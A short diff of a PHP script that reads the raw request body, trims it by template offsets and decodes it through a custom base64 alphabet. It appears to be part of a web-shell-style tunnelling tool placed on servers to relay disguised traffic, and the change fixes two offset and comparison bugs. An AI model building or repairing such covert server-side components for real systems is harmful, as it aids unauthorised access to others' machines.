@@ -58,9 +58,9 @@ $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 $de = "BASE64 CHARSLIST";
 
 $post_data = file_get_contents("php://input");
-if (USE_REQUEST_TEMPLATE) {
+if (USE_REQUEST_TEMPLATE == 1) {
     $post_data = substr($post_data, START_INDEX);
-    $post_data = substr($post_data, 0, END_INDEX);
+    $post_data = substr($post_data, 0, -END_INDEX);
 }
 $info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
 $rinfo = array();
